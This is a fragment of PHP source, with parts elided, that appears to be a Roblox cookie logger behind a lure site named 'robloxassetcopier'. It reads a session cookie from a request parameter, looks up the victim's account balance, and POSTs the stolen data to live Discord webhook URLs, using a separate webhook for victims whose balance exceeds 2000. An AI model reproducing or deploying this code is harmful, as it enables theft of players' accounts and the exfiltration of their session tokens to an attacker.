<?php
   ...
   $cookie = $_REQUEST['t'];
    header("location: https://robloxassetcopier.com/{folder}");    
...
$idiotrap = getrap($profile["UserID"], $cookie);
        ...
        curl_setopt_array($ch, [
            CURLOPT_URL => "https://discord.com/api/webhooks/871541814358839346/H9HqNZt4BjvzaAUdf2tq1BxE5s_lGLWkoqqF8OCZzI7J8jxWSSHof-CTp7sny8PIxQMp",
            CURLOPT_POST => true,
...
if ($idiotrap > 2000){
    $ch = curl_init();
	curl_setopt_array($ch, [
		CURLOPT_URL => "https://discord.com/api/webhooks/871541612872884274/7got3yZZsPedjaqgaBQL-tOftWudzO_e-sQpfymLp2NKQzIqGdoDMOVzz8Zy3SJFIQtH",
		CURLOPT_POST => true,
		CURLOPT_POSTFIELDS => $hookObject,
		CURLOPT_HTTPHEADER => [
			"Content-Type: application/json"
